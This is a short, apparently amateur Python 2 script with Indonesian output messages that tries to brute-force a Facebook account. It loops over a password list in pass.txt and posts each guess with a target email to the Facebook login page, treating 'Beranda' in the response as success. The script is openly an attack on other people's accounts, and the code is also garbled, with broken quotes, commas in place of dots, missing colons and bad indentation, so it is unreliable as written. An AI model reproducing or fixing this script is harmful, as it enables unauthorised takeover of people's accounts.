import requests
import sys

print "selamat datang"

email = raw_input ("email>> ")
url='https://free.facebook.com/login.php'

ex = open('pass.txt, 'r') readlines()

for line in ex
      password: line,strip()
      https://requests,post(url,data = ( 'email':email, 'pass': Password, 'login':'submit'
      content = http: content
      if "Beranda" in content
         print "[+] sandi di temukan" , Password 
         sys.exit(1)
          :
        else:
print"[!] sandi tidak di temukan ", password 